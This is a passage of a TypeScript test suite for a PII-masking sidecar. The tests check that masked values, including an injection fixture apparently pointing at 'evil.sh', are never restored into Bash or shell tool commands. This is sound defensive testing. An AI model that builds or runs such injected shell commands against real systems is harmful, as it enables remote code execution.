    const status = await app.inject({ method: 'GET', url: '/v1/sidecar/status', headers: AUTH });
    expect(status.json()).toMatchObject({ sessions: 0 });
  });

  it('a supersede needs the token', async () => {
    const { app } = await withShutdown(true, readyTracker());
    const res = await app.inject({
      method: 'PUT',
      url: '/v1/sidecar/sessions/w1.x',
      headers: { [SUPERSEDES_HEADER]: 'w1' },
    });
    expect(res.statusCode).toBe(401);
  });

  it('refuses a new session once it has answered 202, until the process ends', async () => {
    const { app } = await withShutdown(true, readyTracker());
    await usedAndClosed(app);
    const res = await shutdownCall(app);
    expect(res.statusCode).toBe(202);
    const put = await app.inject({ method: 'PUT', url: '/v1/sidecar/sessions/s2', headers: AUTH });
    expect(put.statusCode).toBe(503);
    expect(put.json()).toEqual({ error: 'sidecar_closing' });
  });

  it('answers 202 again without stopping a second time', async () => {
    const { app, stopped } = await withShutdown(true, readyTracker());
    await usedAndClosed(app);
    const first = await shutdownCall(app);
    const second = await shutdownCall(app);
    expect(first.statusCode).toBe(202);
    expect(second.statusCode).toBe(202);
    expect(await stopsAfterATurn(stopped)).toBe(1);
  });
});

describe('sidecar · restore with tool', () => {
  interface ShellRestoreBody {
    value: Record<string, string>;
    replacements: number;
    shellKeptMasked?: string[];
  }

  /** Open session `s1`, mask `text` in it, return its placeholders. */
  async function placeholdersFor(app: FastifyInstance, text: string): Promise<string[]> {
    await open(app, 's1');
    const res = await app.inject({
      method: 'POST',
      url: '/v1/sidecar/sessions/s1/sanitize',
      headers: authFor('s1'),
      payload: { value: text },
    });
    return (res.json() as { value: string }).value.match(PLACEHOLDER) ?? [];
  }

  function restore(app: FastifyInstance, payload: Record<string, unknown>) {
    return app.inject({
      method: 'POST',
      url: '/v1/sidecar/sessions/s1/restore',
      headers: authFor('s1'),
      payload,
    });
  }

  function commitWith(message: string): string {
    return `git commit -F - <<'EOF'\n${message}\nEOF`;
  }

  it('keeps an unsafe unquoted value masked and lists its placeholder, never the value', async () => {
    const { app } = await setup();
    const [secret] = await placeholdersFor(app, INJECTION);

    const res = await restore(app, {
      value: { command: `echo ${secret}` },
      fields: ['command'],
      tool: 'Bash',
    });

    expect(res.statusCode).toBe(200);
    const body = res.json() as ShellRestoreBody;
    expect(body.value.command).toBe(`echo ${secret}`);
    expect(body.shellKeptMasked).toEqual([secret]);
    expect(res.body).not.toContain(INJECTION);
    expect(res.body).not.toContain('evil.sh');
  });

  it('keeps the same value masked inside single quotes too: it is not inert', async () => {
    const { app } = await setup();
    const [secret] = await placeholdersFor(app, INJECTION);

    const res = await restore(app, {
      value: { command: `echo '${secret}'` },
      fields: ['command'],
      tool: 'Bash',
    });

    const body = res.json() as ShellRestoreBody;
    expect(body.value.command).toBe(`echo '${secret}'`);
    expect(body.shellKeptMasked).toEqual([secret]);
    expect(res.body).not.toContain(INJECTION);
  });

  it('keeps a name with a space masked inside single quotes', async () => {
    const { app } = await setup();
    const [person] = await placeholdersFor(app, FULL_NAME);

    const res = await restore(app, {
      value: { command: `echo '${person}'` },
      fields: ['command'],
      tool: 'Bash',
    });

    const body = res.json() as ShellRestoreBody;
    expect(body.value.command).toBe(`echo '${person}'`);
    expect(body.shellKeptMasked).toEqual([person]);
  });

  it('keeps a name masked even in a quoted heredoc commit message: no shell command gets a value', async () => {
    const { app } = await setup();
    const [person] = await placeholdersFor(app, FULL_NAME);

    const res = await restore(app, {
      value: { command: commitWith(`Thanks ${person}`) },
      fields: ['command'],
      tool: 'Bash',
    });

    const body = res.json() as ShellRestoreBody;
    expect(body.value.command).toBe(commitWith(`Thanks ${person}`));
    expect(body.shellKeptMasked).toEqual([person]);
  });

  it('keeps a `python3 - <<EOF` body masked, never returning the value', async () => {
    const { app } = await setup();
    const [person] = await placeholdersFor(app, FULL_NAME);
    const command = `python3 - <<'EOF'\nprint('${person}')\nEOF`;

    const res = await restore(app, { value: { command }, fields: ['command'], tool: 'Bash' });

    const body = res.json() as ShellRestoreBody;
    expect(body.value.command).toBe(command);
    expect(body.shellKeptMasked).toEqual([person]);
    expect(res.body).not.toContain(FULL_NAME);
  });

  it('keeps every field of a shell tool masked, the description too', async () => {
    const { app } = await setup();
    const [secret] = await placeholdersFor(app, INJECTION);

    const res = await restore(app, {
      value: { command: `echo ${secret}`, description: `print ${secret}` },
      tool: 'Bash',
    });

    const body = res.json() as ShellRestoreBody;
    expect(body.value.command).toBe(`echo ${secret}`);
    expect(body.value.description).toBe(`print ${secret}`);
    expect(body.shellKeptMasked).toEqual([secret]);
  });

  it('without `tool`: plain restore, unchanged, and no shellKeptMasked field', async () => {
    const { app } = await setup();
    const [secret] = await placeholdersFor(app, INJECTION);

    const res = await restore(app, { value: { command: `echo ${secret}` }, fields: ['command'] });

    expect(res.statusCode).toBe(200);
    const body = res.json() as ShellRestoreBody;
    expect(body.value.command).toBe(`echo ${INJECTION}`);
    expect(body.replacements).toBe(1);
    expect(Object.hasOwn(body, 'shellKeptMasked')).toBe(false);
  });

  it('rejects `tool` on a value that is not an object', async () => {
    const { app } = await setup();
    await placeholdersFor(app, INJECTION);

    const res = await restore(app, { value: 'echo hi', tool: 'Bash' });

    expect(res.statusCode).toBe(400);
    expect(res.json()).toEqual({ error: 'tool_requires_object_value' });
  });

  it('puts nothing back into a tool outside restoreTools, and counts what it held', async () => {
    const { app } = await setup();
    const [person] = await placeholdersFor(app, FULL_NAME);
    const value = { url: `https://example.org/?q=${person}`, prompt: `about ${person}` };

    const res = await restore(app, { value, tool: 'WebFetch' });

    expect(res.statusCode).toBe(200);
    expect(res.json()).toEqual({
      value,
      replacements: 0,
      replacementsByLabel: {},
      unknownPlaceholders: 0,
      foreignPlaceholders: 0,
      heldForTool: 2,
    });
    expect(res.body).not.toContain(FULL_NAME);
  });

  it('follows the configured restoreTools, not a built-in list', async () => {
    const { app } = await setup({ restoreTools: new Set(['mcp__files__write']) });
    const [person] = await placeholdersFor(app, FULL_NAME);

    const mcp = await restore(app, { value: { text: person }, tool: 'mcp__files__write' });
    const bash = await restore(app, { value: { command: `echo '${person}'` }, tool: 'Bash' });

    expect((mcp.json() as ShellRestoreBody).value.text).toBe(FULL_NAME);
    // A shell tool gets nothing whatever the list says, and its
    // placeholders are listed so the caller can refuse the call.
    expect((bash.json() as ShellRestoreBody).value.command).toBe(`echo '${person}'`);
    expect(bash.json()).toMatchObject({ replacements: 0, shellKeptMasked: [person] });
  });

  it('gives the lower-case shell tools of other agents no value either', async () => {
    const { app } = await setup();
    const [secret] = await placeholdersFor(app, INJECTION);

    for (const tool of ['bash', 'shell']) {
      const res = await restore(app, { value: { command: `echo ${secret}` }, tool });
      expect((res.json() as ShellRestoreBody).shellKeptMasked).toEqual([secret]);
    }
  });

  it('gives a `command` given as an argv array no value', async () => {
    const { app } = await setup();
    const [secret] = await placeholdersFor(app, INJECTION);
    const value = { command: ['bash', '-lc', `echo ${secret}`] };

    const res = await restore(app, { value, tool: 'shell' });

    expect(res.json()).toMatchObject({ value, replacements: 0, shellKeptMasked: [secret] });
    expect(res.body).not.toContain('evil.sh');
  });
});

describe('sidecar · words the model could not read', () => {
  it('reports how many, without the text', async () => {
    const { app } = await setup();
    const opened = await app.inject({
      method: 'PUT',
      url: '/v1/sidecar/sessions/s1',
      headers: AUTH,
    });
    const secret = (opened.json() as { secret: string }).secret;
    const res = await app.inject({
      method: 'POST',
      url: '/v1/sidecar/sessions/s1/sanitize',
      headers: { ...AUTH, [SESSION_SECRET_HEADER]: secret },
      payload: { value: { a: `owner John ${UNREADABLE}`, b: 'plain' } },
    });
    expect(res.json()).toMatchObject({ captured: 1, modelUnscannedWords: 1 });
  });
});

describe('sidecar · sanitize cache', () => {
  const VALUE = { stdout: 'owner: John <john@acme.io>' };

  async function sanitize(app: FastifyInstance, key: string, value: unknown) {
    return app.inject({
      method: 'POST',
      url: `/v1/sidecar/sessions/${key}/sanitize`,
      headers: authFor(key),
      payload: { value },
    });
  }

  it('answers a repeated value from the cache, identical and without the model', async () => {
    const { app, modelCalls } = await setup();
    await open(app, 's1');
    const first = await sanitize(app, 's1', VALUE);
    const callsAfterFirst = modelCalls();
    const second = await sanitize(app, 's1', VALUE);
    expect(first.headers['x-nullpii-cache']).toBe('miss');
    expect(second.headers['x-nullpii-cache']).toBe('hit');
    expect(second.body).toBe(first.body);
    expect(modelCalls()).toBe(callsAfterFirst);
  });

  it('keeps sessions apart: another session runs the model and gets its own placeholders', async () => {
    const { app } = await setup();
    for (const key of ['s1', 's2']) {
      await open(app, key);
    }
    const a = await sanitize(app, 's1', VALUE);
    const b = await sanitize(app, 's2', VALUE);
    expect(b.headers['x-nullpii-cache']).toBe('miss');
    expect(b.body).not.toBe(a.body);
  });

  it('a cached response still restores in its session', async () => {
    const { app } = await setup();
    await open(app, 's1');
    await sanitize(app, 's1', VALUE);
    const cached = await sanitize(app, 's1', VALUE);
    const restored = await app.inject({
      method: 'POST',
      url: '/v1/sidecar/sessions/s1/restore',
      headers: authFor('s1'),
      payload: { value: (cached.json() as { value: unknown }).value },
    });
    expect((restored.json() as { value: unknown }).value).toEqual(VALUE);
  });

  it('starts empty again after the session is closed and reopened', async () => {
    const { app } = await setup();
    await open(app, 's1');
    await sanitize(app, 's1', VALUE);
    await app.inject({ method: 'DELETE', url: '/v1/sidecar/sessions/s1', headers: authFor('s1') });
    await open(app, 's1');
    const again = await sanitize(app, 's1', VALUE);
    expect(again.headers['x-nullpii-cache']).toBe('miss');
  });
});

describe('SanitizeCache', () => {
  it('drops the least recently used entries past its entry bound', () => {
    const cache = new SanitizeCache();
    for (let i = 0; i <= SANITIZE_CACHE_MAX_ENTRIES; i += 1) cache.set(`k${i}`, 'x');
    expect(cache.size).toBe(SANITIZE_CACHE_MAX_ENTRIES);
    expect(cache.get('k0')).toBeUndefined();
    expect(cache.get(`k${SANITIZE_CACHE_MAX_ENTRIES}`)).toBe('x');
  });

  it('keeps a recently read entry over an older one', () => {
    const cache = new SanitizeCache();
    for (let i = 0; i < SANITIZE_CACHE_MAX_ENTRIES; i += 1) cache.set(`k${i}`, 'x');
    cache.get('k0');
    cache.set('new', 'x');
    expect(cache.get('k0')).toBe('x');
    expect(cache.get('k1')).toBeUndefined();
  });

  it('never stores a response larger than its character bound', () => {
    const cache = new SanitizeCache();
    cache.set('big', 'x'.repeat(SANITIZE_CACHE_MAX_CHARS + 1));
    expect(cache.get('big')).toBeUndefined();
  });
});

describe('sidecar · policy', () => {
  let policyDir = '';
  beforeEach(() => {
    policyDir = mkdtempSync(join(tmpdir(), 'nullpii-policy-'));
  });
  afterEach(() => rmSync(policyDir, { recursive: true, force: true }));

  function putPolicy(
    app: FastifyInstance,
    config: unknown,
    headers: Record<string, string> = AUTH,
  ) {
    return app.inject({ method: 'PUT', url: '/v1/sidecar/policy', headers, payload: { config } });
  }

  it('replaces the policy live: written to its file, applied to the engine and the restore tools', async () => {
    const engine = buildMockNullPii();
    const file = join(policyDir, 'nullpii', 'config.json');
    const { app } = await setup({ policyFile: file }, engine);
    const config = {
      categories: { private_url: 'ask', private_date: 'mask' },
      restoreTools: ['Read'],
    };

    const res = await putPolicy(app, config);

    expect(res.statusCode).toBe(200);
    expect(JSON.parse(readFileSync(file, 'utf8'))).toEqual(config);
    const status = (
      await app.inject({ method: 'GET', url: '/v1/sidecar/status', headers: AUTH })
    ).json() as {
      policy: {
        loaded: boolean;
        categories: Record<string, string>;
        restoreTools: string[];
        disabledCategories: string[];
      };
    };
    expect(status.policy.loaded).toBe(true);
    expect(status.policy.categories.private_url).toBe('ask');
    expect(status.policy.disabledCategories).not.toContain('private_date');
    expect(status.policy.restoreTools).toEqual(['Read']);
    expect(engine.policies).toHaveLength(1);
    expect(engine.policies[0]).toMatchObject({
      disabledCategories: expect.not.arrayContaining(['private_date']),
    });
  });

  it('refuses an invalid policy and changes nothing', async () => {
    const engine = buildMockNullPii();
    const file = join(policyDir, 'config.json');
    const { app } = await setup({ policyFile: file }, engine);

    const res = await putPolicy(app, { categories: { private_url: 'maybe' } });

    expect(res.statusCode).toBe(400);
    expect((res.json() as { error: string }).error).toBe('invalid_policy');
    expect(existsSync(file)).toBe(false);
    expect(engine.policies).toHaveLength(0);
  });

  it('needs the token', async () => {
    const { app } = await setup({ policyFile: join(policyDir, 'config.json') });

    const res = await putPolicy(app, {}, {});

    expect(res.statusCode).toBe(401);
  });

  it('forgets the cached sanitize responses masked under the old policy', async () => {
    const { app } = await setup({ policyFile: join(policyDir, 'config.json') });
    await open(app, 's1');
    const sanitize = () =>
      app.inject({
        method: 'POST',
        url: '/v1/sidecar/sessions/s1/sanitize',
        headers: authFor('s1'),
        payload: { value: `hello ${FULL_NAME}` },
      });
    await sanitize();
    expect((await sanitize()).headers['x-nullpii-cache']).toBe('hit');

    await putPolicy(app, { categories: { private_person: 'off' } });

    expect((await sanitize()).headers['x-nullpii-cache']).toBe('miss');
  });

  async function versionOf(app: FastifyInstance): Promise<string> {
    const res = await app.inject({ method: 'GET', url: '/v1/sidecar/status', headers: AUTH });
    return (res.json() as { policy: { version: string } }).policy.version;
  }

  it('versions the policy: the same policy has the same version after a restart, a new one another', async () => {
    const file = join(policyDir, 'config.json');
    const first = (await setup({ policyFile: file })).app;
    const second = (await setup({ policyFile: file })).app;
    const before = await versionOf(first);
    expect(before).toMatch(/^[0-9a-f]{32}$/);
    expect(await versionOf(second)).toBe(before);

    const res = await putPolicy(first, { categories: { private_person: 'off' } });

    const after = (res.json() as { policy: { version: string } }).policy.version;
    expect(after).not.toBe(before);
    expect(await versionOf(first)).toBe(after);
  });

  it('a sanitize or restore sent with an older version is refused (412) and nothing runs', async () => {
    const { app, modelCalls } = await setup({ policyFile: join(policyDir, 'config.json') });
    await open(app, 's1');
    const seen = await versionOf(app);
    // A command holding only the token replaces the policy.
    await putPolicy(app, { categories: { private_person: 'off' }, restoreTools: ['WebFetch'] });
    const now = await versionOf(app);
    const headers = { ...authFor('s1'), [POLICY_VERSION_HEADER]: seen };
    const calls = modelCalls();

    const sanitized = await app.inject({
      method: 'POST',
      url: '/v1/sidecar/sessions/s1/sanitize',
      headers,
      payload: { value: `hello ${FULL_NAME}` },
    });
    const restored = await app.inject({
      method: 'POST',
      url: '/v1/sidecar/sessions/s1/restore',
      headers,
      payload: { value: { url: 'https://x.test/' }, tool: 'WebFetch' },
    });

    for (const res of [sanitized, restored]) {
      expect(res.statusCode).toBe(412);
      expect(res.json()).toEqual({ error: 'policy_changed', version: now });
    }
    expect(modelCalls()).toBe(calls);
  });

  it('a sanitize sent with the current version runs', async () => {
    const { app } = await setup({ policyFile: join(policyDir, 'config.json') });
    await open(app, 's1');
    const res = await app.inject({
      method: 'POST',
      url: '/v1/sidecar/sessions/s1/sanitize',
      headers: { ...authFor('s1'), [POLICY_VERSION_HEADER]: await versionOf(app) },
      payload: { value: `hello ${FULL_NAME}` },
    });
    expect(res.statusCode).toBe(200);
  });

  it('a policy sent on top of an older version is refused (412) and nothing changes', async () => {
    const engine = buildMockNullPii();
    const file = join(policyDir, 'config.json');
    const { app } = await setup({ policyFile: file }, engine);
    const seen = await versionOf(app);
    await putPolicy(app, { categories: { private_date: 'mask' } });

    const res = await putPolicy(
      app,
      { categories: { private_title: 'off' } },
      { ...AUTH, [POLICY_VERSION_HEADER]: seen },
    );

    expect(res.statusCode).toBe(412);
    expect(JSON.parse(readFileSync(file, 'utf8'))).toEqual({
      categories: { private_date: 'mask' },
    });
    expect(engine.policies).toHaveLength(1);
  });

  it('refuses a policy over the policy file size limit, which the next start would not load', async () => {
    const file = join(policyDir, 'config.json');
    const { app } = await setup({ policyFile: file });
    const big = { urlAllowlist: Array.from({ length: 4_000 }, (_, i) => `host-${i}.example.com`) };

    const res = await putPolicy(app, big);

    expect(res.statusCode).toBe(400);
    expect(existsSync(file)).toBe(false);
  });

  it('a sanitize running across a policy change leaves no cached answer for later requests', async () => {
    const engine = buildMockNullPii();
    let release: () => void = () => {};
    const gate = new Promise<void>((resolve) => {
      release = resolve;
    });
    const sanitize = engine.np.sanitize.bind(engine.np);
    let first = true;
    engine.np.sanitize = (async (text: string, sessionId?: string) => {
      if (first) {
        first = false;
        await gate;
      }
      return sanitize(text, sessionId);
    }) as typeof engine.np.sanitize;
    const { app } = await setup({ policyFile: join(policyDir, 'config.json') }, engine);
    await open(app, 's1');
    const call = () =>
      app.inject({
        method: 'POST',
        url: '/v1/sidecar/sessions/s1/sanitize',
        headers: authFor('s1'),
        payload: { value: `hello ${FULL_NAME}` },
      });

    const running = call();
    await new Promise((resolve) => setTimeout(resolve, 10));
    await putPolicy(app, { categories: { private_person: 'mask' } });
    release();
    await running;

    expect((await call()).headers['x-nullpii-cache']).toBe('miss');
  });

  it('a sanitize that runs across a change, even one put back, answers 412 to a caller that named its version, and caches nothing', async () => {
    // Like NullPii, this engine reads its policy after the model's await.
    const vault = new PiiVault();
    let disabled = new Set<string>();
    let release: () => void = () => {};
    const gate = new Promise<void>((resolve) => {
      release = resolve;
    });
    let first = true;
    const np = {
      updatePolicy(policy: { disabledCategories?: string[] }) {
        disabled = new Set(policy.disabledCategories ?? []);
      },
      async sanitize(text: string, sessionId?: string) {
        if (first) {
          first = false;
          await gate;
        }
        const id = sessionId ?? vault.createSession();
        const spans = [...text.matchAll(/Ada Lovelace/g)]
          .map((m) => ({
            label: 'private_person' as const,
            start: m.index ?? 0,
            end: (m.index ?? 0) + m[0].length,
            text: m[0],
            score: 1,
          }))
          .filter((span) => !disabled.has(span.label));
        const r = vault.sanitize(text, spans, id);
        return { sessionId: id, sanitized: r.sanitized, spans, modelUnscannedWords: 0 };
      },
      restore: (text: string, sessionId: string) => vault.restore(text, sessionId),
      createSession: () => vault.createSession(),
      destroySession: (sessionId: string) => vault.destroySession(sessionId),
      diagnostics: () => ({
        version: '0.5.4',
        backend: 'cpu',
        modelRevision: TEST_MODEL_REVISION,
        modelFilesPinned: true,
      }),
    } as unknown as NullPii;
    const { app } = await setup(
      { policyFile: join(policyDir, 'config.json'), restoreTools: new Set(DEFAULT_RESTORE_TOOLS) },
      { np, vault },
    );
    await open(app, 's1');
    const v1 = await versionOf(app);
    const status = await app.inject({ method: 'GET', url: '/v1/sidecar/status', headers: AUTH });
    const original = (status.json() as { policy: { config: unknown } }).policy.config;
    const call = () =>
      app.inject({
        method: 'POST',
        url: '/v1/sidecar/sessions/s1/sanitize',
        headers: { ...authFor('s1'), [POLICY_VERSION_HEADER]: v1 },
        payload: { value: `hello ${FULL_NAME}` },
      });

    const running = call();
    await new Promise((resolve) => setTimeout(resolve, 10));
    // A command holding only the token widens the policy, then puts it back.
    await putPolicy(app, { disabledCategories: ['private_person'] });
    release();
    const answer = await running;
    await putPolicy(app, original);
    expect(await versionOf(app)).toBe(v1);

    expect(answer.statusCode).toBe(412);
    expect(answer.body).not.toContain(FULL_NAME);
    const after = await call();
    expect(after.statusCode).toBe(200);
    expect(after.headers['x-nullpii-cache']).toBe('miss');
    expect(after.body).not.toContain(FULL_NAME);
  });
});
